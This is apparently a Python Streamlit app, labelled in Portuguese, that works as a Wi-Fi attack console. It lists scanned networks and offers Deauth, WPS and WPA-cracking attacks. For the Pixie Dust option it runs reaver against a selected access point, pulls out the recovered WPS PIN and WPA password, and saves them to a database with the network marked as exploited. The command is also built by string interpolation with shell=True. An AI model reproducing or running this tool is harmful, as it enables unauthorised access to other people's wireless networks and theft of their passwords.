import streamlit as st
import sqlite3
import pandas as pd
import subprocess
from time import sleep

# Funções para interagir com o banco de dados
def connect_db():
    return sqlite3.connect('wifi_networks.db')

def get_strongest_networks(limit=20):
    conn = connect_db()
    query = '''       
        SELECT * 
        FROM networks                                                              
        ORDER BY signal_strength DESC, last_seen DESC                                                                                              
        LIMIT ?                                                                                                                                    
    '''
    df = pd.read_sql_query(query, conn, params=(limit,))
    conn.close()
    return df

def update_network_status(mac, wps_psk):
    conn = connect_db()
    cursor = conn.cursor()
    
    # Atualiza a rede como explorada e salva a senha
    cursor.execute('''
        UPDATE networks 
        SET exploited = 1, password = ? 
        WHERE mac = ?
    ''', (wps_psk, mac))
    
    conn.commit()
    conn.close()

def get_attacks():
    return [
        "Deauth",   
        "WPS Pin Pixie Dust",                                            
        "WPS Null Pin",                                                  
        "WPS Pin Brute Force",                                           
        "WPA Handshake Cracking"                                                                                                                   
    ]

# Configuração da página                                                                                                                           
st.set_page_config(page_title="Gerenciador de Redes Wi-Fi", page_icon="📶")

# Título do aplicativo                                                                                                                             
st.title("Gerenciador de Redes Wi-Fi")                                                                                                             

# Criar abas       
tab1, tab2 = st.tabs(["Visualizar Redes", "Selecionar Rede para Ataque"])                                                                          
                                                                                                                                                   
### Aba 1: Visualizar Redes ###                                                                                                                    
with tab1:                                                                                                                                         
    st.subheader("Redes Wi-Fi Encontradas")                                                                                                        
                                                                                                                                                   
    # Obter as redes mais fortes                                                                                                                   
    networks_df = get_strongest_networks()                                                                                                         
                                                                                                                                                   
    # Exibir a tabela com destaque para redes exploradas
    if not networks_df.empty:
        st.write(networks_df)
        def highlight_exploited(row):
            return ['background-color: red' if row['exploited'] else '' for _ in row]
         
        # Formatar a coluna WPS como 'Sim' ou 'Não'
        networks_df['wps_enabled'] = networks_df['wps_enabled'].apply(lambda x: 'Sim' if x else 'Não')
         
        # Exibir a tabela com as colunas desejadas
        columns_to_display = ['mac', 'ssid', 'exploited', 'signal_strength', 'first_seen', 'last_seen', 'wps_enabled']
        styled_df = networks_df[columns_to_display].style.apply(highlight_exploited, axis=1)
         
        st.dataframe(styled_df)
    else:
        st.warning("Nenhuma rede encontrada.")

### Aba 2: Selecionar Rede para Ataque ###
with tab2:
    st.subheader("Selecionar Rede para Ataque")
     
    # Obter as redes disponíveis novamente
    networks_df = get_strongest_networks()
     
    if not networks_df.empty:
        selected_ssid = st.selectbox("Escolha uma rede:", networks_df['ssid'].tolist())
         
        # Selecionar tipo de ataque
        attack_options = get_attacks()
        selected_attack = st.selectbox("Escolha um tipo de ataque:", attack_options)
         
        if st.button("Iniciar Ataque"):
            selected_mac = networks_df.loc[networks_df['ssid'] == selected_ssid, 'mac'].values[0]
            output_text = ""

            if selected_attack == "WPS Pin Pixie Dust":
                # Executar o comando reaver com o MAC selecionado
                command = f"echo '\n' | reaver -i wlx0036765525cc -b {selected_mac} -K"
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    if 'success' in output.decode('utf-8'):
                        wps_pin = output.decode('utf-8').split("[+] WPS PIN: ")[1].split("\n")[0]
                        wps_psk = output.decode('utf-8').split("[+] WPA PSK: ")[1].split("\n")[0]
                        st.write(f"WPS PIN: {wps_pin}")
                        st.write(f"WPS PSK: {wps_psk}")
                        st.write(f"AP SSID: {selected_ssid}")
                        st.text_area("Output:", output.decode('utf-8'), height=300)

                        # Salvar a senha no banco de dados e atualizar o status de exploração
                        update_network_status(selected_mac, wps_psk)
                        st.success(f"A rede '{selected_ssid}' foi explorada com sucesso!")
                    else:
                        st.error("O ataque não foi bem-sucedido.")
                except subprocess.CalledProcessError as e:
                    st.error(f"Ocorreu um erro ao executar o comando: {e.output.decode('utf-8')}")
            else:
                st.success(f"Iniciando ataque '{selected_attack}' na rede '{selected_ssid}'...")
                # Implementação para outros tipos de ataque pode ser adicionada aqui.

    else:
        st.warning("Nenhuma rede disponível para ataque.")